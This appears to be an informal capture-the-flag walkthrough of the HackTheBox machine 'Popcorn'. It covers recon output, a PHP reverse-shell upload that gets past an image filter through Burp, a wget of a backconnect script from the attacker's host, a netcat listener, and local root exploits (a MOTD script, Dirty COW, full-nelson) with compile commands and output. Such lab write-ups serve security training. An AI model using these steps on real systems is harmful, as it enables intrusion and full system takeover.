
# Popcorn 

this is the walk-through of popcorn;

No metasploit cause fuck automation

1. NMAP:

```
Starting Nmap 7.80 ( https://nmap.org ) at 2020-06-09 13:47 EDT
Nmap scan report for 10.10.10.6
Host is up (0.094s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 5.1p1 Debian 6ubuntu2 (Ubuntu Linux;
| ssh-hostkey:
|   1024 3e:c8:1b:15:21:15:50:ec:6e:63:bc:c5:6b:80:7b:38 (DSA)
|_  2048 aa:1f:79:21:b8:42:f4:8a:38:bd:b8:05:ef:1a:07:4d (RSA)
80/tcp open  http    Apache httpd 2.2.12 ((Ubuntu))
|_http-server-header: Apache/2.2.12 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```


2.dirsearch & dirbuster:
```
_|. _ _  _  _  _ _|_    v0.3.9                                          
(_||| _) (/_(_|| (_| )   
Extensions: .php,  | HTTP method: get | Threads: 10 | Wordlist size: 4614




Error Log: /root/dirsearch/logs/errors-20-06-09_14-17-54.log




Target: http://10.10.10.6/                                               
                                                                         
[14:17:54] Starting:
[14:17:55] 200 -  177B  - /
[14:17:55] 403 -  282B  - /.hta        
[14:18:03] 403 -  286B  - /cgi-bin/                   
[14:18:14] 200 -  177B  - /index                     
[14:18:14] 200 -  177B  - /index.html
[14:18:34] 200 -   48KB - /test                 
[14:18:34] 301 -  310B  - /torrent  ->  http://10.10.10.6/torrent/
[14:18:39] 403 -  291B  - /server-status                                    
Task Completed              
```

```
root@kali:~# gobuster dir -u http://10.10.10.6/torrent -e .php, .txt, .json -w /usr/share/wordlists/dirb/common.txt -q
(filtered manually)
http://10.10.10.6/torrent/browse (Status: 200)
http://10.10.10.6/torrent/database (Status: 301)
http://10.10.10.6/torrent/download (Status: 200)
http://10.10.10.6/torrent/index (Status: 200)
http://10.10.10.6/torrent/index.php (Status: 200)
http://10.10.10.6/torrent/torrents (Status: 301)
http://10.10.10.6/torrent/upload (Status: 301)
```

4.going to /torrent we find that its a torrent hoster

furthermore  we notice that we can login so we insert a fake email and make an account



so now we want to install any random torrent file, i installed the kali linux torrent and uploaded it, upon inspection of our upload we notice we can edit the screenshot of the file 



so we upload any random image and head to 10.10.10.6/torrent/upload , and there it is you should be able to see the file you uploaded


6.so we know that this site is vulnerable to php exploits by initial scan, now we install a php reverse shell from pentestmonkey, then edit the IP address and when we want to save the php file it should be saved as shell.php.png because the screenshot editor does not accept php specifically add the .png in the end after the php and then right before uploading the screenshot have burpsuite intercept it we edit the POST and we can see here the content type and file name

now simply edit out the .png  part, and then the file should be uplaoded 

after that simply launch netcat to listen to the port that the payload is on using;
```
nc -nvlp <PORT>
```
and then click the .php file when your in torrent/uploads which should give you a shell!, and now move to home to the user Goerge and then we should be able to get the user.txt !, and with taht when we ls -la that user we find something interesting called .cache




----------------------------------------------------------------------------------------------------------------------------------------------------------------------------
1) the first thing to do in your methodology is snoop around the user your in, using ls -la it shows all hidden directories
and check every. single. one., and when you do that you will find a folder called .cache with a file in it, when you use
cat read the file it has a mention of MOTD and when you run it against search sploit you will get 3 exploits, 2 of them are
actually useable, so the one were gonna be using is 14339.sh, also uname -a shows kernal version and that might be useful
(to which it is since we found out that the kernal is outdated

1.2) 14339.sh aka privesc.sh

if you proceed with this exploit this is one of the exploits  theres multiple ways you can do this, i tried to initially run a
python -m SimpleHTTPServer in the same director as the file and then i would wget http://xx.xx.xx.xx:8000/<filename>.sh but
that didnt fucking work for me for some reason so instead where gonna take the other route

-run this command (xclip copies it to our clipboard)
```
cat /usr/share/exploitdb/exploits/linux/local/14339.sh|xclip
```

-then type "vi .privesc.sh"(creates a vim text file) simply paste then it save it and should be written then, so to launch it, it would simply be;
```
"bash .privesc.sh"
```
and that should do it for you and then simply press enter and now the password should be removed and
be replaced by toor
-now;
```
cd /root/
ls  -la
cat root.txt
```

summary = bash exploit that removes root password and replaces it with toor
----------------------------------------------------------------------------------------------------------------------------------------------------------------

1.3) dirty cow

after we have gained access into the user we want to escalate our privileges and for dirty cow we need to check if we have gcc installed
```
www-data@popcorn$ which gcc
usr/bin/gcc
```

- and now that we know gcc is installed we can exploit it with dirty cow and we know that we had an issue with using the python method of transferring files so were going to continue using xclip;
```
vi dirty.c
```
- paste the code from the actual script 

and with the script you should always check the script if they have compile instructions which they do luckily;
```
// This exploit uses the pokemon exploit of the dirtycow vulnerability
// as a base and automatically generates a new passwd line.
// The user will be prompted for the new password when the binary is run.
// The original /etc/passwd file is then backed up to /tmp/passwd.bak
// and overwrites the root account with the generated line.
// After running the exploit you should be able to login with the newly
// created user.
//
// To use this exploit modify the user values according to your needs.
// The default is "firefart".
//
// Original exploit (dirtycow's ptrace_pokedata "pokemon" method):
// https://github.com/dirtycow/dirtycow.github.io/blob/master/pokemon.c
//
// Compile with:
// gcc -pthread dirty.c -o dirty -lcrypt
//
// Then run the newly create binary by either doing:
// "./dirty" or "./dirty my-new-password"
//
// Afterwards, you can either "su firefart" or "ssh firefart@..."
//
// DON'T FORGET TO RESTORE YOUR /etc/passwd AFTER RUNNING THE EXPLOIT!
// mv /tmp/passwd.bak /etc/passwd
//
// Exploit adopted by Christian "FireFart" Mehlmauer
// https://firefart.at
```

after exploitation it will ask a new password enter it and then you should be able to ssh into the box as a very similar exploit is called the full nelson exploit the only difference is this is how its exploited after being transferred to the box
```
www-data@popcorn:/tmp$ gcc 15704.c -o ech0.privesc
gcc 15704.c -o ech0.privesc
www-data@popcorn:/tmp$ chmod +x ech0.privesc
chmod +x ech0.privesc
www-data@popcorn:/tmp$ ./ech0.privesc
./ech0.privesc
[*] Resolving kernel addresses...
[+] Resolved econet_ioctl to 0xf83d4280
[+] Resolved econet_ops to 0xf83d4360
[+] Resolved commit_creds to 0xc01645d0
[+] Resolved prepare_kernel_cred to 0xc01647d0
[*] Calculating target...
[*] Triggering payload...
[*] Got root!
# cat /root/root.txt
cat /root/root.txt
```


summary = c oriented exploit that creates a new user with root permissions
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------
Exploitation 2.0

when doing the burpsuite part what you can do is to simply take out bites from the image that was uploaded, copy the magic bites and then what you need to do is to paste those magic bites into the intercepted php payload


and then use the python pty shells;
firstly you want to use backconnect.py since thats the reverse shell and then transfer that file over to the victims box rather than a php exploit (i think), now after uploading the PHP exploit refresh the page to intercept the request to then upload the file using the request being sent to repeater,
```
ipp=wget XX.XX.XX.XX:8000/tcp_pty_backconnect.py -O /dev/shm/rev.py
```
 dev shm is just the ram disk so its not saved to the hard drive


right before uploading the file, lets launch the handler
```
python tcp_pty_shell_handler.py -b XX.XX.XX.XX:XXXX
```
and after launching the exploit you should get a shell and done, after that then just cd /dev/shm  and then we try to find the password
```
find /home -printf -type f "%f\t%p\t%u\t%g\t%g\t%m\n" 2>dev/null | column -t
```


-----------------------------------------------------------
summary:
1.you should learn now how to upload a php reverse shell
2.use burpsuite to sneak it in
3.check kernal version
4.how to use clipboard if wget and running a server doesn't work ( |xclip, then vi .<filename>.sh/php/c
5.how to run and use C oriented exploits (when doing research for the kernel version dirty cow must show up)
6.remember to check the exploit for compile instructions (in which for dirty cow is gcc -pthread 40839.c -o dirty -lcrypt
and after exploitation su firefart)
